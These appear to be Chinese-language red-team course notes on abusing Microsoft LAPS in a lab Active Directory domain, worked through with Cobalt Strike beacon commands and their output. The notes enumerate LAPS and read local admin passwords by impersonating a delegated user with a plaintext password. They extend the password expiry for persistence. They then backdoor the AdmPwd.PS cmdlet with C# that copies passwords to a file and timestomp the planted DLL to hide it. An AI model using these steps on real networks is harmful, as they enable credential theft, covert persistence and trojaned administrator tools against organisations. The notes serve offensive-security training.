# Local Administrator Password Solution

LAPS 工作原理：
1. Active Directory 架构得到扩展，并向计算机对象添加了两个新属性，称为ms-Mcs-AdmPwd和ms-Mcs-AdmPwdExpirationTime（The Active Directory schema is extended and adds two new properties to computer objects, called ms-Mcs-AdmPwd and ms-Mcs-AdmPwdExpirationTime）

2. 默认情况下，DACL onAdmPwd仅授予域管理员读取权限。每个计算机对象都被授予更新其自身对象的这些属性的权限（By default, the DACL on AdmPwd only grants read access to Domain Admins. Each computer object is given permission to update these properties on its own object.）

3. 可以将阅读权限AdmPwd委托给其他主体（用户、组等）。这通常在 OU 级别完成（Rights to read AdmPwd can be delegated to other principals (users, groups etc). This is typically done at the OU level.）

4. 安装了一个新的 GPO 模板，用于将 LAPS 配置部署到机器（不同的策略可以应用于不同的 OU）（A new GPO template is installed, which is used to deploy the LAPS configuration to machines (different policies can be applied to different OUs)）

5. LAPS 客户端也安装在每台机器上（通常通过 GPO 或第三方软件管理解决方案分发）（The LAPS client is also installed on every machine (commonly distributed via GPO or a third-party software management solution)）

6. 当一台机器执行 gpupdate 时，它​​会检查AdmPwdExpirationTimeAD 中它自己的计算机对象的属性。如果时间已过，它将生成一个新密码（基于 LAPS 策略）并将其设置在AdmPwd属性上（When a machine performs a gpupdate, it will check the AdmPwdExpirationTime property on its own computer object in AD. If the time has elapsed, it will generate a new password (based on the LAPS policy) and sets it on the AdmPwd property.）


有几种方法可以寻找 LAPS 的存在。如果 LAPS 应用于您有权访问的计算机，则AdmPwd.dll将在磁盘上

```
beacon> run hostname
wkstn-1

beacon> ls C:\Program Files\LAPS\CSE

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 145kb    fil     09/22/2016 08:02:08   AdmPwd.dll
```

查找名称中包含“LAPS”或其他一些描述性术语的 GPO
```
beacon> powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

displayname    : LAPS
name           : {4A8A4E8E-929F-401A-95BD-A7D40E0976C8}
gpcfilesyspath : \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}
```

搜索```ms-Mcs-AdmPwdExpirationTime```属性不为空的计算机对象（任何域用户都可以读取此属性）
```
beacon> powershell Get-DomainObject -SearchBase "LDAP://DC=dev,DC=cyberbotic,DC=io" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname

dnshostname              
-----------              
wkstn-1.dev.cyberbotic.io
wkstn-2.dev.cyberbotic.io
```

如果我们能找到正确的GPO，我们可以从```gpcfilesyspath```下载LAPS的配置文件
```
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     03/16/2021 16:59:45   Scripts
 575b     fil     03/16/2021 17:11:46   comment.cmtx
 740b     fil     03/16/2021 17:11:46   Registry.pol

beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol
[*] started download of \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol (740 bytes)
[*] download of Registry.pol is complete
```
## GPRegistryPolicyParser
[GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser)这个工具里的```Parse-PolFile```方法可以把上面的配置文件转成人类可读的格式
```
PS C:\Users\Administrator\Desktop> Parse-PolFile .\Registry.pol

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordComplexity
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 3    <-- Password contains uppers, lowers and numbers (4 would also include specials)

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordLength
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 14   <-- Password length is 14

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordAgeDays
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 7    <-- Password is changed every 7 days

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdminAccountName
ValueType   : REG_SZ
ValueLength : 14
ValueData   : lapsadmin   <-- The name of the local admin account to manage

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdmPwdEnabled
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 1   <-- LAPS is enabled
```

BloodHound 里等价查询应用了 LAPS 的计算机的方法
```
MATCH (c:Computer {haslaps: true}) RETURN c
```

BloodHound 里等价查询所有通过LAPS对域机器有特殊权限的组
```
MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p
```

![alt BloodHound](https://rto-assets.s3.eu-west-2.amazonaws.com/laps/bloodhound-readlapspassword.png?width=1920)

如果我们横向的计算机安装了LAPS PowerShell，则可以使用以下方法
```
beacon> powershell Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS
```

```Find-AdmPwdExtendedRights```返回允许读取 LAPS password 的所有OU
```
beacon> run hostname
wkstn-2

beacon> getuid
[*] You are DEV\nlamb

beacon> powershell Find-AdmPwdExtendedRights -Identity Workstations | fl

ObjectDN             : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
ExtendedRightHolders : {NT AUTHORITY\SYSTEM, DEV\Domain Admins, DEV\1st Line Support}
```

上面结果表明，可以读取LAPS 密码属性的三个OU是：NT AUTHORITY\SYSTEM，DEV\Domain Admins，DEV\1st Line Support


由于域管理员可以读取所有 LAPS 密码属性,Get-AdmPwdPassword读取指定计算机的密码
```
beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl

ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : WRSZV43u16qkc1
ExpirationTimestamp : 5/20/2021 12:57:36 PM
```

如果已经是DA，大概不太需要通过这种方式读取到密码，但是从之前的结果可知，```DEV\1st Line Support```这个组的成员也可以读取LAPS 密码属性，因此我们可以通过横向到这个组成员，然后读取需要的密码进行横向或者提权

注意，当前账号```DEV\bfarmer```是没有权限读取LAPS密码的
```
beacon> run hostname
wkstn-1

beacon> getuid
[*] You are DEV\bfarmer

beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl

ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : 
ExpirationTimestamp : 5/20/2021 12:57:36 PM
```

我们首先横向到一个```DEV\1st Line Support```组成员```DEV\jking```，然后再次读取LAPS密码
```
beacon> make_token DEV\jking Purpl3Drag0n
beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl

ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : P0OPwa4R64AkbJ
ExpirationTimestamp : 3/23/2021 5:18:43 PM

beacon> rev2self
beacon> make_token .\lapsadmin P0OPwa4R64AkbJ
beacon> ls \\wkstn-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 14:35:19   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
```

## powerview
如果当前账号没有 LAPS cmdlets方法集，powerview的ms-Mcs-AdmPwd和ReadPropery 也可以等价枚举出LAPS密码
```
beacon> powershell Get-DomainObjectAcl -SearchBase "LDAP://OU=Workstations,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -like "*ReadProperty*" } | select ObjectDN, SecurityIdentifier

ObjectDN                                              SecurityIdentifier
--------                                              ------------------
OU=Workstations,DC=dev,DC=cyberbotic,DC=io            S-1-5-21-3263068140-2042698922-2891547269-1125
CN=WKSTN-1,OU=Workstations,DC=dev,DC=cyberbotic,DC=io S-1-5-21-3263068140-2042698922-2891547269-1125
CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io S-1-5-21-3263068140-2042698922-2891547269-1125

beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
DEV\1st Line Support

beacon> make_token DEV\jking Purpl3Drag0n
beacon> powershell Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd

ms-mcs-admpwd 
------------- 
P0OPwa4R64AkbJ
```

课本捎带提到了[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)这个工具也可以做类似上面的操作

# LAPS Persistence

LAPS持久性，主要通过更新密码的过期时间来实现

查看过期时间
```
beacon> powershell Get-DomainObject -Identity wkstn-2 -Properties ms-mcs-admpwdexpirationtime

ms-mcs-admpwdexpirationtime
---------------------------
         132609935231523081
```

更新过期时间
```
beacon> run hostname
wkstn-2

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> powershell Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```

再次查看密码的过期时间
```
beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl

ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : P0OPwa4R64AkbJ
ExpirationTimestamp : 2/11/2338 11:05:23 AM
```

**如果管理员使用Reset-AdmPwdPassword cmdlet，或者在LAPS GPO中启用了 "不允许密码过期时间超过策略要求"，密码仍然会重置。**


# LAPS Backdoors

LAPS后门，主要通过修改PowerShell cmdlet里的方法，当管理员进行操作时，我们会得到一个密码的副本

查看PowerShell cmdlet所在文件夹
```
beacon> ls
[*] Listing: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     03/16/2021 17:09:59   en-US
 30kb     fil     09/23/2016 00:38:16   AdmPwd.PS.dll
 5kb      fil     08/23/2016 14:40:58   AdmPwd.PS.format.ps1xml
 4kb      fil     08/23/2016 14:40:58   AdmPwd.PS.psd1
 33kb     fil     09/22/2016 08:02:08   AdmPwd.Utils.dll
```

[源码](https://github.com/GreyCorbel/admpwd),查看```Get-AdmPwdPassword```这个方法，文件位置：```Main/AdmPwd.PS/Main.cs```
```
[Cmdlet("Get", "AdmPwdPassword")]
public class GetPassword : Cmdlet
{
    [Parameter(Mandatory = true, Position = 0, ValueFromPipeline = true)]
    public String ComputerName;

    protected override void ProcessRecord()
    {
        foreach (string dn in DirectoryUtils.GetComputerDN(ComputerName))
        {
            PasswordInfo pi = DirectoryUtils.GetPasswordInfo(dn);
            WriteObject(pi);
        }
    }
}v
```

添加以下后门代码
```
PasswordInfo pi = DirectoryUtils.GetPasswordInfo(dn);

var line = $"{pi.ComputerName} : {pi.Password}";
System.IO.File.AppendAllText(@"C:\Temp\LAPS.txt", line);

WriteObject(pi);
```

编译并上传为文件```AdmPwd.PS.dll```
```
beacon> upload C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll
```

使用 Beacon 的```timestomp```命令“克隆”```AdmPwd.PS.psd1```的时间戳并将其应用于AdmPwd.PS.dll

```
beacon> timestomp AdmPwd.PS.dll AdmPwd.PS.psd1
beacon> ls
[*] Listing: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     03/16/2021 17:09:59   en-US
 15kb     fil     08/23/2016 14:40:58   AdmPwd.PS.dll
 5kb      fil     08/23/2016 14:40:58   AdmPwd.PS.format.ps1xml
 4kb      fil     08/23/2016 14:40:58   AdmPwd.PS.psd1
 33kb     fil     09/22/2016 08:02:08   AdmPwd.Utils.dll
```

运行```Get-AdmPwdPassword```然后检查```C:\Temp```,已经生成我们的后门密码副本
```
beacon> ls C:\Temp

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 24b      fil     03/16/2021 18:48:13   LAPS.txt

beacon> shell type C:\Temp\LAPS.txt
WKSTN-2 : P0OPwa4R64AkbJ
```